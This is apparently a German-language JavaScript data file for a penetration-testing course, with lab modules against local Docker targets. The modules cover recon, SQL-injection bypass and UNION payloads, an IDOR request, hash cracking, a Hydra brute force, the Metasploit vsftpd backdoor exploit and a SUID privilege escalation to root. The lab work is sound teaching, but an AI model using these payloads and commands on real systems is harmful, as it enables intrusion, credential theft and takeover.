// „Kali anwenden“ – praktischer Strang: echte Kali-Werkzeuge gegen sichere, lokal gestartete
// Docker-Übungsziele. Ziel: nicht nur verstehen, sondern wirklich anwenden können.
// WICHTIG: alles nur auf dem EIGENEN Rechner (localhost) bzw. eigenen VMs. Nie fremde Systeme.
// Der Strang wächst Werkzeug für Werkzeug (Recon → Web → Passwörter → Exploitation).

export const KALIPRAXIS = [
  {
    id: 'recon', icon: '🔎', titel: 'Recon in echt: ein Ziel ausleuchten', stufe: 'Einstieg', team: 'Rot',
    einleitung: 'Jeder echte Test beginnt mit Aufklärung (Recon): Was läuft auf dem Ziel? Welche Dienste, welche versteckten Pfade, welche Auffälligkeiten? Du machst das jetzt mit den echten Kali-Werkzeugen gegen ein Übungsziel auf deinem eigenen Rechner.',
    ziel: {
      name: 'OWASP Juice Shop (Docker)',
      start: 'docker run --rm -p 3000:3000 bkimminich/juice-shop',
      hinweis: 'Läuft nur lokal auf deinem Rechner. Lass das Terminal-Fenster offen; mit Strg+C beendest du das Ziel wieder.',
      pruef: 'Öffne http://localhost:3000 im Browser – lädt der Shop, läuft dein Ziel. (Beim ersten Mal lädt Docker das Image kurz herunter.)',
    },
    schritte: [
      {
        id: 'nmap', werkzeug: 'Nmap', frage_art: 'antwort',
        aufgabe: 'Finde heraus, welche Ports/Dienste offen sind.',
        befehl: 'nmap -sV -p- 127.0.0.1',
        erwartet: 'Eine offene Zeile, z. B.: 3000/tcp open http Node.js Express framework',
        frage: 'Auf welchem Port antwortet Juice Shop?', antwort: ['3000'], tipp: 'Steht in der nmap-Ausgabe (…/tcp open).',
      },
      {
        id: 'gobuster', werkzeug: 'gobuster', frage_art: 'antwort',
        aufgabe: 'Suche versteckte Pfade/Verzeichnisse auf dem Webserver.',
        befehl: 'gobuster dir -u http://127.0.0.1:3000 -w /usr/share/wordlists/dirb/common.txt',
        erwartet: 'Treffer mit Status 200/301, u. a. /ftp und /robots.txt.',
        frage: 'Welcher gefundene Pfad beginnt mit „/f"?', antwort: ['/ftp', 'ftp'], tipp: 'Ein klassischer versteckter Ordner in Juice Shop.',
      },
      {
        id: 'nikto', werkzeug: 'Nikto', frage_art: 'abhaken',
        aufgabe: 'Lass einen Schwachstellen-Scanner über die Kopfzeilen laufen.',
        befehl: 'nikto -h http://127.0.0.1:3000',
        erwartet: 'Hinweise auf fehlende Sicherheits-Header (z. B. X-Frame-Options) und andere Auffälligkeiten.',
        frage: 'Gelaufen? Mindestens einen Header-Hinweis gesehen?', tipp: 'Nikto braucht etwas – lass es durchlaufen.',
      },
    ],
    abschluss: 'Das war echtes Recon: offene Dienste (nmap) → versteckte Pfade (gobuster) → Auffälligkeiten (nikto). Genau in dieser Reihenfolge fängt fast jeder Test an. Dieselben Werkzeuge nutzt du gleich für alle weiteren Ziele.',
  },
  {
    id: 'web', icon: '🌐', titel: 'Web-Angriff in echt: Login umgehen & Zugriffsfehler', stufe: 'Aufbau', team: 'Rot',
    einleitung: 'Jetzt geht es um echte Web-Lücken – die häufigsten der Welt (OWASP Top 10). Du findest einen versteckten Bereich, hebelst den Login per SQL-Injection aus und greifst über die API auf fremde Daten zu (IDOR). Alles im selben Juice-Shop-Ziel wie beim Recon.',
    ziel: {
      name: 'OWASP Juice Shop (Docker)',
      start: 'docker run --rm -p 3000:3000 bkimminich/juice-shop',
      hinweis: 'Falls noch vom Recon-Modul offen: einfach weiterlaufen lassen. Sonst neu starten und das Fenster offen lassen.',
      pruef: 'Öffne http://localhost:3000 – lädt der Shop, kann es losgehen.',
    },
    schritte: [
      {
        id: 'scoreboard', werkzeug: 'Browser + DevTools', frage_art: 'antwort',
        aufgabe: 'Finde die versteckte Übersichtsseite, auf der alle Challenges stehen. Sie ist nicht verlinkt – aber im JavaScript-Code zu finden.',
        befehl: 'Im Browser: F12 → Reiter „Quellen/Sources" → main.js öffnen → mit Strg+F nach „score" suchen.',
        erwartet: 'Im Code taucht ein Routen-Name auf, der auf eine Tafel mit allen Aufgaben zeigt.',
        frage: 'Wie heißt die versteckte Seite (der Teil nach #/)?', antwort: ['score-board', 'scoreboard', '#/score-board'], tipp: 'Zwei Wörter mit Bindestrich. Danach kannst du sie per http://localhost:3000/#/score-board öffnen.',
      },
      {
        id: 'sqli', werkzeug: 'SQL-Injection (Login)', frage_art: 'antwort',
        aufgabe: 'Melde dich an, OHNE das Passwort zu kennen. Trick: Das E-Mail-Feld wird ungeprüft in eine Datenbank-Abfrage gesteckt. Mit einem Hochkomma brichst du die Abfrage auf.',
        befehl: "E-Mail:  ' OR 1=1--     Passwort: egal (irgendwas)",
        erwartet: 'Login klappt – du landest als allererster Benutzer (der Admin) im Shop.',
        frage: 'Als welche E-Mail-Adresse bist du jetzt eingeloggt?', antwort: ['admin@juice-sh.op'], tipp: 'Oben rechts im Konto-Menü steht die Mail. Es ist das erste Konto der Datenbank.',
      },
      {
        id: 'idor', werkzeug: 'curl (API / IDOR)', frage_art: 'abhaken',
        aufgabe: 'Zugriffsfehler ausnutzen (IDOR): Die API prüft nicht, OB dir ein Warenkorb gehört – sie gibt ihn nur nach Nummer heraus. Zähl die Nummer hoch und sieh einen fremden Korb.',
        befehl: 'curl http://127.0.0.1:3000/rest/basket/2',
        erwartet: 'Du bekommst JSON zu einem Warenkorb, der dir nicht gehört – obwohl du nur für deinen eigenen berechtigt wärst.',
        frage: 'Fremden Warenkorb (andere Nummer) abgerufen?', tipp: 'Probier /rest/basket/1, /2, /3 … Jede Nummer ist ein anderer Nutzer.',
      },
    ],
    abschluss: 'Drei Welt-Klassiker erlebt: versteckten Bereich gefunden, Login per SQL-Injection umgangen, Zugriffskontrolle per IDOR ausgehebelt. Genau solche Fehler stehen oben in den OWASP Top 10 – und genau danach suchst du bei echten Web-Tests.',
  },
  {
    id: 'sqli', icon: '💉', titel: 'SQL-Injection in echt: Datenbank auslesen', stufe: 'Aufbau', team: 'Rot',
    einleitung: 'SQL-Injection ist die Mutter vieler Daten-Lecks: Eingaben landen ungeprüft in einer Datenbank-Abfrage. Du hebelst zuerst den Filter aus, ziehst dann gezielt Benutzer samt Passwort-Hashes heraus und knackst am Ende einen Hash. Übungsziel ist die DVWA – eine absichtlich verwundbare Lern-App.',
    ziel: {
      name: 'DVWA – Damn Vulnerable Web App (Docker)',
      start: 'docker run --rm -it -p 8080:80 vulnerables/web-dvwa',
      hinweis: 'Öffne http://localhost:8080 → ganz unten „Create / Reset Database" klicken → mit admin / password anmelden → Reiter „DVWA Security" auf „Low" stellen.',
      pruef: 'Erscheint links das Menü mit „SQL Injection", bist du startklar.',
    },
    schritte: [
      {
        id: 'bypass', werkzeug: 'SQL-Injection (Browser)', frage_art: 'abhaken',
        aufgabe: 'Geh auf „SQL Injection". Statt einer Zahl schiebst du eine immer-wahre Bedingung in das Feld – und bekommst ALLE Datensätze statt nur einem.',
        befehl: "User ID:  1' OR '1'='1",
        erwartet: 'Die Seite listet mehrere First-name/Surname-Paare – nicht nur einen Treffer.',
        frage: 'Mehr als einen Benutzer angezeigt bekommen?', tipp: "Das Hochkomma beendet die Zeichenkette, OR '1'='1' macht die Bedingung immer wahr.",
      },
      {
        id: 'union', werkzeug: 'UNION SELECT', frage_art: 'antwort',
        aufgabe: 'Zieh über denselben Eingabepunkt gezielt Benutzernamen und Passwort-Hashes aus der Tabelle „users".',
        befehl: "User ID:  1' UNION SELECT user, password FROM users#",
        erwartet: 'Zu jedem Benutzer erscheint ein langer 32-Zeichen-Hash (MD5).',
        frage: 'Wie viele Benutzer-Konten listet die Tabelle?', antwort: ['5'], tipp: 'Zähl die Zeilen mit Hash: admin, gordonb, 1337, pablo, smithy.',
      },
      {
        id: 'crack', werkzeug: 'John the Ripper', frage_art: 'antwort',
        aufgabe: 'Der Admin-Hash ist unsalziges MD5. Knacke ihn mit einem Wörterbuch – so siehst du, warum schwache Passwörter wertlos sind.',
        befehl: "echo 5f4dcc3b5aa765d61d8327deb882cf99 > hash.txt\njohn --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
        erwartet: 'John zeigt das geknackte Passwort im Klartext an.',
        frage: 'Wie lautet das Admin-Passwort im Klartext?', antwort: ['password'], tipp: 'Eines der häufigsten Passwörter überhaupt. (rockyou ggf. erst entpacken: gunzip /usr/share/wordlists/rockyou.txt.gz)',
      },
    ],
    abschluss: 'Die komplette SQL-Injection-Kette: Filter aushebeln (OR 1=1) → gezielt Daten ziehen (UNION SELECT) → geklaute Hashes knacken (John). Deshalb sind parametrisierte Abfragen und starke, gesalzene Passwörter Pflicht – du hast live gesehen, was sonst passiert.',
  },
  {
    id: 'passwoerter', icon: '🔑', titel: 'Passwörter in echt: knacken & erraten', stufe: 'Aufbau', team: 'Rot',
    einleitung: 'Passwort-Angriffe gibt es in zwei Welten: offline knackst du einen geklauten Hash (John, Hashcat) – online rätst du gegen einen echten Login (Hydra). Beides übst du hier lokal. Die ersten beiden Aufgaben brauchen nur Kali selbst, für Hydra nimmst du dieselbe DVWA wie im SQLi-Modul.',
    ziel: {
      name: 'DVWA – Brute-Force-Seite (Docker)',
      start: 'docker run --rm -it -p 8080:80 vulnerables/web-dvwa',
      hinweis: 'Für die Hydra-Aufgabe: DVWA wie im SQLi-Modul starten (http://localhost:8080 → „Create / Reset Database" → admin/password → Security „Low"). Die beiden Knack-Aufgaben laufen ohne Ziel – nur Kali + das Wörterbuch rockyou.',
      pruef: 'Für Hydra muss links „Brute Force" erreichbar sein. (rockyou ggf. entpacken: gunzip /usr/share/wordlists/rockyou.txt.gz)',
    },
    schritte: [
      {
        id: 'md5', werkzeug: 'John the Ripper', frage_art: 'antwort',
        aufgabe: 'Offline-Angriff: Du hast nur den Hash, brauchst keinen Login. Knacke diesen MD5-Hash mit dem Standard-Wörterbuch rockyou.',
        befehl: 'echo 0d107d09f5bbe40cade3de5c71e9e9b7 > h1.txt\njohn --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt h1.txt',
        erwartet: 'John zeigt nach kurzer Zeit das Klartext-Passwort an.',
        frage: 'Wie lautet das Passwort?', antwort: ['letmein'], tipp: 'Zwei englische Wörter – „lass mich rein". Später erneut ansehen mit: john --show --format=raw-md5 h1.txt',
      },
      {
        id: 'sha1', werkzeug: 'Hashcat', frage_art: 'antwort',
        aufgabe: 'Gleiches Spiel mit Hashcat und einem SHA1-Hash. „-m 100" steht für SHA1.',
        befehl: 'echo 18c28604dd31094a8d69dae60f1bcd347f1afc5a > h2.txt\nhashcat -m 100 h2.txt /usr/share/wordlists/rockyou.txt',
        erwartet: 'Hashcat zeigt am Ende „hash:klartext".',
        frage: 'Wie lautet das Passwort?', antwort: ['superman'], tipp: 'Ein Superheld. Ergebnis erneut zeigen mit: hashcat -m 100 h2.txt --show',
      },
      {
        id: 'hydra', werkzeug: 'Hydra (online)', frage_art: 'abhaken',
        aufgabe: 'Online-Angriff: gegen einen echten Login raten. Ziel ist DVWAs „Brute Force"-Seite. Den Cookie (PHPSESSID + security=low) holst du aus den DevTools (F12 → Application → Cookies).',
        befehl: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: PHPSESSID=DEINE_SID; security=low"',
        erwartet: 'Hydra meldet einen Treffer: login: admin  password: password.',
        frage: 'Hydra hat das Passwort gefunden?', tipp: 'DEINE_SID durch den echten Wert aus den DevTools ersetzen. Treffer ist admin/password.',
      },
    ],
    abschluss: 'Zwei Welten der Passwort-Angriffe erlebt: offline geklaute Hashes knacken (John, Hashcat), online gegen einen echten Login raten (Hydra). Beides scheitert an langen, einzigartigen Passwörtern und gesalzenen, langsamen Hash-Verfahren – genau das ist die Lehre.',
  },
  {
    id: 'exploit', icon: '🧨', titel: 'Exploitation in echt: erste Shell mit Metasploit', stufe: 'Könner', team: 'Rot',
    einleitung: 'Vom Finden zum Übernehmen: Metasploit bündelt fertige Exploits. Du nimmst den berühmtesten Einsteiger-Exploit (die vsftpd-2.3.4-Hintertür) gegen die Übungs-Maschine Metasploitable 2 und bekommst eine Root-Shell – ausschließlich im eigenen, abgeschotteten Labor.',
    ziel: {
      name: 'Metasploitable 2 (Docker)',
      start: 'docker run --rm -it -p 21:21 -p 6200:6200 tleemcjr/metasploitable2',
      hinweis: 'Metasploitable ist absichtlich voller Lücken – NIEMALS ins Internet hängen, nur lokal. Metasploit startest du in einem zweiten Terminal.',
      pruef: 'nmap -sV -p21 127.0.0.1 zeigt 21/tcp open ftp vsftpd 2.3.4.',
    },
    schritte: [
      {
        id: 'scan', werkzeug: 'Nmap', frage_art: 'antwort',
        aufgabe: 'Finde den verwundbaren Dienst: scanne Port 21 und lies die genaue Versionsnummer.',
        befehl: 'nmap -sV -p21 127.0.0.1',
        erwartet: '21/tcp open ftp vsftpd 2.3.4',
        frage: 'Welche vsftpd-Version läuft?', antwort: ['2.3.4', 'vsftpd 2.3.4'], tipp: 'Genau diese Version hat eine eingebaute Hintertür.',
      },
      {
        id: 'use', werkzeug: 'Metasploit', frage_art: 'abhaken',
        aufgabe: 'Starte Metasploit und lade den passenden Exploit-Baustein gegen das Ziel.',
        befehl: 'msfconsole -q\nuse exploit/unix/ftp/vsftpd_234_backdoor\nset RHOSTS 127.0.0.1\nexploit',
        erwartet: 'Metasploit meldet „Command shell session 1 opened".',
        frage: 'Session geöffnet (Shell bekommen)?', tipp: 'Die vsftpd-2.3.4-Hintertür öffnet beim Login einen Shell-Port (6200).',
      },
      {
        id: 'root', werkzeug: 'Shell', frage_art: 'antwort',
        aufgabe: 'Du bist auf dem Ziel. Prüfe, welche Rechte du hast.',
        befehl: 'whoami\nid',
        erwartet: 'Die Ausgabe zeigt root bzw. uid=0.',
        frage: 'Als welcher Benutzer bist du auf dem Ziel?', antwort: ['root'], tipp: 'Die Hintertür gibt dir die höchsten Rechte – uid=0.',
      },
    ],
    abschluss: 'Die volle Angriffskette: Dienst + Version finden (nmap) → passenden Exploit wählen (Metasploit) → Rechte prüfen (whoami/id). Eine einzige veraltete Version hat gereicht, um Root zu werden. Die Lehre: patchen, patchen, patchen – und immer nur im eigenen Labor üben.',
  },
  {
    id: 'privesc', icon: '🧗', titel: 'Rechte-Ausweitung in echt: vom Benutzer zu root', stufe: 'Könner', team: 'Rot',
    einleitung: 'Du bist „drin" – aber nur als normaler Benutzer. Jetzt der Klassiker: von einem einfachen Konto zu root. Du findest die Fehlkonfiguration automatisch mit linPEAS und nutzt sie mit einem GTFOBins-Trick aus. Das Übungssystem richtest du mit einem Setup-Block selbst ein (so ist es überall gleich und sicher).',
    ziel: {
      name: 'Übungs-Linux (Docker, Ubuntu)',
      start: 'docker run --rm -it ubuntu:24.04 bash\n# Im Container dieses Setup einfügen (normaler Benutzer „anna" + typische Fehlkonfiguration):\napt-get update -qq && apt-get install -y -qq sudo curl >/dev/null\nuseradd -m -s /bin/bash anna && echo anna:anna | chpasswd\necho \'GEHEIM{nur_fuer_root}\' > /root/flag.txt && chmod 600 /root/flag.txt\ncp /usr/bin/find /usr/bin/find-tool && chmod 4755 /usr/bin/find-tool\nsu - anna',
      hinweis: 'Alles läuft lokal im Container. Nach „su - anna" bist du der normale Benutzer – ab hier beginnt der Angriff. Das echte /root/flag.txt kannst du als anna NICHT lesen (Rechte 600).',
      pruef: 'Tippe `id` – steht dort „uid=1000(anna)", bist du als normaler Benutzer bereit.',
    },
    schritte: [
      {
        id: 'peas', werkzeug: 'linPEAS', frage_art: 'abhaken',
        aufgabe: 'Automatische Aufklärung: Lade linPEAS und lass es das System nach Schwachstellen absuchen. Es markiert Auffälligkeiten farbig.',
        befehl: 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh\nsh linpeas.sh | less -r',
        erwartet: 'Im Abschnitt „SUID" hebt linPEAS eine ungewöhnliche Datei hervor (nicht aus der Standard-Liste).',
        frage: 'linPEAS gelaufen und die auffällige SUID-Datei gesehen?', tipp: 'Mit Leertaste blättern, „q" beendet. Rot/gelb = interessant.',
      },
      {
        id: 'suid', werkzeug: 'find', frage_art: 'antwort',
        aufgabe: 'Finde selbst alle Dateien mit SUID-Recht (laufen mit den Rechten des Besitzers, hier root). Eine davon gehört da nicht hin.',
        befehl: 'find / -perm -4000 -type f 2>/dev/null',
        erwartet: 'Neben normalen Systemdateien (passwd, sudo …) taucht eine ungewöhnliche auf.',
        frage: 'Wie heißt die ungewöhnliche SUID-Datei?', antwort: ['find-tool', '/usr/bin/find-tool'], tipp: 'Sie sieht aus wie ein bekanntes Werkzeug mit angehängtem Namen.',
      },
      {
        id: 'root', werkzeug: 'GTFOBins-Trick', frage_art: 'antwort',
        aufgabe: 'Nutze die SUID-Datei aus: find kann Befehle starten – mit SUID starten sie als root. „-p" hält die Root-Rechte in der Shell. Dann liest du die nur-für-root-Datei.',
        befehl: 'find-tool . -exec /bin/sh -p \\; -quit\n# jetzt bist du root:\nid\ncat /root/flag.txt',
        erwartet: 'id zeigt euid=0 (root), und du kannst /root/flag.txt lesen.',
        frage: 'Wie lautet der Inhalt von /root/flag.txt?', antwort: ['GEHEIM{nur_fuer_root}', 'nur_fuer_root'], tipp: 'Nach dem find-Trick bist du root – dann cat /root/flag.txt.',
      },
    ],
    abschluss: 'Das ist Rechte-Ausweitung (Privilege Escalation): als normaler Benutzer rein → mit linPEAS die Fehlkonfiguration finden → mit dem GTFOBins-Trick zu root → Geheimnis lesen. Deshalb: SUID-Rechte so sparsam wie möglich, Konfigurationen regelmäßig prüfen – denn die Verteidiger nutzen linPEAS genauso.',
  },
];

// Noch geplante Module dieses Strangs (werden nach und nach gebaut).
export const KALIPRAXIS_GEPLANT = [
  { icon: '🪟', titel: 'Windows & Active Directory: Grundlagen angreifen' },
  { icon: '📡', titel: 'WLAN & Netzwerk: mitlesen und knacken (aircrack-ng)' },
  { icon: '🐳', titel: 'Container & Cloud: aus Docker ausbrechen' },
];
